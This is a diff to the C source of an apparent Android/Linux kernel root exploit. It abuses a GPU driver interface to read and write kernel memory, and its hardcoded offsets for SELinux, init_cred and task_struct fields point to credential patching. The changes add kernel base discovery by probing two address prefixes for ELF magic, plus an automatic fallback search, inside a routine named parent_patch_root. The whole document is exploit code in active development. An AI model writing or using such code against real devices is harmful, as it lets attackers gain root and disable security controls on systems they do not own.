@@ -26,7 +26,6 @@
 // Updated with Batch Spray and Fast Scan optimizations
 #define KERNEL_BASE          0xffffffb000000000ULL
 #define SELINUX_OFFSET       0x02f74ce8ULL
-#define INIT_TASK_OFFSET     0x02afb380ULL
 #define INIT_CRED_OFFSET     0x018f9038ULL
 
 #define OFFSET_PID           0x650
@@ -98,6 +97,7 @@ static void flush_icache(void *addr, size_t len)
 }
 
 static int gpu_read_task_struct(int fd, uint64_t task_va, uint8_t *buffer, size_t size);
+static uint64_t find_kernel_base_auto(void);
 static int gpu_write_task_virt(int fd, uint64_t dst_va, uint8_t *buffer, size_t size);
 static int gpu_read_u32(int fd, uint64_t src_va, uint32_t *value);
 static void hex_dump_internal(const char *desc, uint64_t addr, uint8_t *data, size_t size);
@@ -1266,19 +1266,31 @@ static int parent_patch_root(int fd, uint64_t cred_ptr) {
     uint32_t my_uid = getuid();
 
     // 1. Resolve Kernel Base - Prioritize verified KERNEL_BASE
-    if (kernel_base == 0 || kernel_base == 0xffffffc000000000ULL) {
+    if (kernel_base == 0) {
         uint8_t elf_magic[4];
-        if (gpu_read_task_struct(fd, KERNEL_BASE, elf_magic, 4) == 0 && 
+        // Try 'b' prefix first (your case)
+        uint64_t base_b = 0xffffffb000000000ULL;
+        if (gpu_read_task_struct(fd, base_b, elf_magic, 4) == 0 && 
             elf_magic[0] == 0x7f && elf_magic[1] == 'E' && elf_magic[2] == 'L' && elf_magic[3] == 'F') {
-            kernel_base = KERNEL_BASE;
-            fprintf(stderr, "[PARENT] Verified KERNEL_BASE confirmed: 0x%lx\n", (unsigned long)kernel_base);
+            kernel_base = base_b;
+            fprintf(stderr, "[PARENT] Verified KERNEL_BASE (b-prefix) confirmed: 0x%lx\n", (unsigned long)kernel_base);
         } else {
+            // Try 'c' prefix
+            uint64_t base_c = 0xffffffc000000000ULL;
+            if (gpu_read_task_struct(fd, base_c, elf_magic, 4) == 0 && 
+                elf_magic[0] == 0x7f && elf_magic[1] == 'E' && elf_magic[2] == 'L' && elf_magic[3] == 'F') {
+                kernel_base = base_c;
+                fprintf(stderr, "[PARENT] Verified KERNEL_BASE (c-prefix) confirmed: 0x%lx\n", (unsigned long)kernel_base);
+            }
+        }
+        
+        if (kernel_base == 0) {
             fprintf(stderr, "[PARENT] KERNEL_BASE mismatch, searching dynamically...\n");
             if (task_va != 0) {
                 kernel_base = find_kernel_base_from_task_va(task_va);
             }
             if (kernel_base == 0) {
-                kernel_base = get_kernel_base();
+                kernel_base = find_kernel_base_auto();
             }
         }
     }
